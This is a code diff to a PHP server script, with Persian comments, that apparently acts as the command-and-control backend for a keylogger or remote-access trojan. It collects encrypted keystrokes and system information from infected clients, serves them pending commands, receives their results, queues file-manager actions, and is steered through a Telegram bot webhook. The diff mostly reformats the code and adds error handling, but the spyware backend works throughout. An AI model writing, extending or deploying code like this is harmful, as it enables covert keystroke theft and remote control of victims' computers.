@@ -3,20 +3,33 @@ require_once 'config.php';
 require_once 'crypto.php';
 require_once 'utils.php';
 require_once 'telegram_handler.php';
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
 
 header('Content-Type: application/json; charset=utf-8');
 
-class ApiHandler {
+class ApiHandler
+{
     private $pdo;
     private $crypto;
 
-    public function __construct() {
-        $this->crypto = new Crypto();
-        $this->connect_db();
-        $this->ensure_directories();
+    public function __construct()
+    {
+        try {
+            $this->crypto = new Crypto();
+            $this->connect_db();
+            $this->ensure_directories();
+        } catch (Exception $e) {
+            $this->log_error("Constructor Error: " . $e->getMessage());
+            http_response_code(500);
+            echo json_encode(['error' => 'Initialization failed'], JSON_UNESCAPED_UNICODE);
+            exit;
+        }
     }
 
-    private function connect_db() {
+    private function connect_db()
+    {
         try {
             $this->pdo = new PDO(
                 "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
@@ -25,14 +38,16 @@ class ApiHandler {
                 [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
             );
         } catch (PDOException $e) {
-            $this->log_error("Database connection failed: " . $e->getMessage());
+            $this->log_error("DB Connection Failed: " . $e->getMessage());
+            error_log("Database Error: " . $e->getMessage()); // خطای جدید
             http_response_code(500);
-            echo json_encode(['error' => 'Database error'], JSON_UNESCAPED_UNICODE);
+            echo json_encode(['error' => 'Database connection failed'], JSON_UNESCAPED_UNICODE);
             exit;
         }
     }
 
-    private function ensure_directories() {
+    private function ensure_directories()
+    {
         foreach ([Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR] as $dir) {
             if (!is_dir($dir)) {
                 mkdir($dir, 0755, true);
@@ -40,9 +55,26 @@ class ApiHandler {
         }
     }
 
-    public function handle_request() {
+
+    public function handle_request()
+    {
+        $raw = file_get_contents('php://input');
+        $json = json_decode($raw, true);
+
+        if (isset($json['update_id'])) {
+            file_put_contents(Config::$WEBHOOK_LOG, date('c') . " TELEGRAM: $raw\n", FILE_APPEND);
+            try {
+                TelegramHandler::handle_telegram_update($this->pdo, $this->crypto, $json);
+            } catch (Exception $e) {
+                $this->log_error("Error in TelegramHandler: " . $e->getMessage());
+                http_response_code(500);
+                echo json_encode(['error' => 'TelegramHandler error'], JSON_UNESCAPED_UNICODE);
+            }
+            return;
+        }
         $action = $_POST['action'] ?? $_GET['action'] ?? '';
         $this->log_webhook();
+
 
         if ($action === 'telegram_webhook') {
             $update = json_decode(file_get_contents('php://input'), true);
@@ -75,11 +107,13 @@ class ApiHandler {
         }
     }
 
-    private function verify_token() {
+    private function verify_token()
+    {
         return isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN;
     }
 
-    private function log_webhook() {
+    private function log_webhook()
+    {
         $data = [
             'time' => date('Y-m-d H:i:s'),
             'method' => $_SERVER['REQUEST_METHOD'],
@@ -90,7 +124,8 @@ class ApiHandler {
         file_put_contents(Config::$WEBHOOK_LOG, json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
     }
 
-    private function handle_upload() {
+    private function handle_upload()
+    {
         $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
         $keystrokes = $this->crypto->decrypt($_POST['keystrokes'] ?? '');
         $system_info = json_decode($this->crypto->decrypt($_POST['system_info'] ?? ''), true);
@@ -116,9 +151,10 @@ class ApiHandler {
         echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
     }
 
-    private function handle_get_commands() {
+    private function handle_get_commands()
+    {
         $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
-        
+
         // افزودن بخش به‌روزرسانی وضعیت آنلاین کاربر
         $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
         $this->pdo->prepare("
@@ -129,21 +165,22 @@ class ApiHandler {
                 ip_address = VALUES(ip_address),
                 last_ip = VALUES(last_ip)
         ")->execute([$client_id, $ip_address, $ip_address]);
-    
+
         // بقیه کد موجود
         $stmt = $this->pdo->prepare("
-            SELECT id, command FROM commands
-            WHERE client_id = ? AND status = 'pending'
-        ");
+        SELECT id, command FROM commands
+        WHERE client_id = ? AND status = 'pending'
+    ");
         $stmt->execute([$client_id]);
         $commands = $stmt->fetchAll(PDO::FETCH_ASSOC);
-    
+
         $this->pdo->prepare("UPDATE commands SET status = 'sent' WHERE client_id = ? AND status = 'pending'")
             ->execute([$client_id]);
-    
+
         echo json_encode(['commands' => $commands], JSON_UNESCAPED_UNICODE);
     }
-    private function handle_command_response() {
+    private function handle_command_response()
+    {
         $command_id = Utils::sanitize_input($_POST['command_id'] ?? '');
         $result = json_decode($this->crypto->decrypt($_POST['result'] ?? ''), true);
 
@@ -164,7 +201,8 @@ class ApiHandler {
         echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
     }
 
-    private function handle_file_manager() {
+    private function handle_file_manager()
+    {
         $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
         $params = json_decode($this->crypto->decrypt($_POST['params'] ?? ''), true);
         $command = [
@@ -181,11 +219,11 @@ class ApiHandler {
         echo json_encode(['status' => 'success', 'command_id' => $this->pdo->lastInsertId()], JSON_UNESCAPED_UNICODE);
     }
 
-    private function log_error($message) {
+    private function log_error($message)
+    {
         Utils::log_error($message);
     }
 }
 
 $api = new ApiHandler();
 $api->handle_request();
-?>
